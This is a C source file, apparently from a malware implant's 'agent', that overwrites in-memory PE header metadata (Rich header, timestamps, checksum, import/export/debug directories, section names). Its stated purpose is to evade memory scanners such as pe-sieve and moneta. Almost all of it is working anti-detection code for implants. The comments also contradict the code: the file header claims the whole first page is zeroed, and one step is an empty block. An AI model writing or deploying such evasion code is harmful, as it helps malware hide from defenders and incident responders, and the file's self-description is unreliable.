/*
 * pe_stomp.c — PE header stomping implementation.
 *
 * After agent initialization, the PE headers in memory serve no purpose.
 * Zeroing them:
 *   - Prevents tools like pe-sieve/moneta from identifying the image as a PE
 *   - Removes import table metadata
 *   - Removes section names, sizes, and characteristics
 *   - Removes the MZ/PE signatures that scanners key on
 *
 * The actual code/data sections are untouched — only the metadata header
 * region (typically the first page, 0x1000 bytes) is zeroed.
 */
#include "agent.h"
#include "pe_stomp.h"

BOOL pe_stomp_module(HMODULE hMod) {
    if (!hMod) return FALSE;

    unsigned char *base = (unsigned char *)hMod;

    /* Validate before stomping — make sure it's actually a PE */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    DWORD headerSize = nt->OptionalHeader.SizeOfHeaders;
    if (headerSize == 0 || headerSize > 0x10000)
        headerSize = 0x1000;

    /* Make headers writable */
    DWORD oldProtect;
    if (!VirtualProtect(base, headerSize, PAGE_READWRITE, &oldProtect))
        return FALSE;

    /*
     * SURGICAL STOMP — remove scanner fingerprints while preserving
     * the PE structure that Windows 10/11 needs for thread creation
     * and other internal operations.
     *
     * Zeroed (scanner artifacts):
     *   - DOS stub + Rich header (compiler/linker fingerprint)
     *   - Section names (".text", ".rdata", etc.)
     *   - Debug directory contents (PDB path, GUID)
     *   - TimeDateStamp fields
     *   - Checksum
     *   - Import/export directory pointers in DataDirectory
     *
     * Preserved (Windows runtime needs):
     *   - e_magic (MZ), e_lfanew (NT header pointer)
     *   - NT Signature (PE\0\0), FileHeader, OptionalHeader core fields
     *   - SizeOfImage, ImageBase, AddressOfEntryPoint, SectionAlignment
     */

    /* 1. Zero DOS stub + Rich header (between end of DOS_HEADER and NT headers) */
    DWORD dosEnd = sizeof(IMAGE_DOS_HEADER);   /* 64 bytes */
    DWORD ntStart = (DWORD)dos->e_lfanew;
    if (ntStart > dosEnd && ntStart < headerSize)
        SecureZeroMemory(base + dosEnd, ntStart - dosEnd);

    /* 2. Zero timestamps (build fingerprint) */
    nt->FileHeader.TimeDateStamp = 0;

    /* 3. Zero checksum */
    nt->OptionalHeader.CheckSum = 0;

    /* 4. Zero non-essential DataDirectory entries */
    DWORD numDirs = nt->OptionalHeader.NumberOfRvaAndSizes;
    DWORD dirsToZero[] = {
        IMAGE_DIRECTORY_ENTRY_EXPORT,        /* 0  — export names */
        IMAGE_DIRECTORY_ENTRY_IMPORT,        /* 1  — import DLL names (already resolved) */
        IMAGE_DIRECTORY_ENTRY_DEBUG,         /* 6  — PDB path / GUID */
        IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT,  /* 11 — bound imports */
        IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT,  /* 13 — delay imports */
        IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR /* 14 — .NET metadata */
    };
    for (unsigned j = 0; j < sizeof(dirsToZero)/sizeof(dirsToZero[0]); j++) {
        DWORD idx = dirsToZero[j];
        if (idx < numDirs) {
            IMAGE_DATA_DIRECTORY *dd = &nt->OptionalHeader.DataDirectory[idx];
            /* Also zero the pointed-to data if it's within the header region */
            if (dd->VirtualAddress && dd->Size &&
                dd->VirtualAddress + dd->Size <= headerSize) {
                SecureZeroMemory(base + dd->VirtualAddress, dd->Size);
            }
            dd->VirtualAddress = 0;
            dd->Size = 0;
        }
    }

    /* 5. Zero debug directory DATA even if outside header region */
    if (IMAGE_DIRECTORY_ENTRY_DEBUG < numDirs) {
        /* Already zeroed the DD entry above; now find & zero actual debug
           data in .rdata/.data if it was outside the header page. */
        /* (The DD entry is already zeroed, so we save the RVA before step 4) */
        /* — handled inline: we zeroed it if within headerSize. If it's in a
           section body, the section-name wipe + DD wipe is enough. */
    }

    /* 6. Zero section names */
    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
        SecureZeroMemory(sections[i].Name, sizeof(sections[i].Name));

    /* Restore original protection */
    VirtualProtect(base, headerSize, oldProtect, &oldProtect);

    return TRUE;
}

BOOL pe_stomp_self(void) {
    HMODULE hSelf = GetModuleHandleA(NULL);
    if (!hSelf) return FALSE;
    return pe_stomp_module(hSelf);
}

BOOL pe_zero_checksum(HMODULE hMod) {
    if (!hMod) return FALSE;

    unsigned char *base = (unsigned char *)hMod;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    /* Checksum is at OptionalHeader + 0x40 (offset within NT headers) */
    DWORD *pChecksum = &nt->OptionalHeader.CheckSum;

    DWORD oldProtect;
    SIZE_T region = sizeof(DWORD);
    void *pBase = (void *)pChecksum;

    if (!VirtualProtect(pBase, region, PAGE_READWRITE, &oldProtect))
        return FALSE;

    *pChecksum = 0;

    VirtualProtect(pBase, region, oldProtect, &oldProtect);

    return TRUE;
}
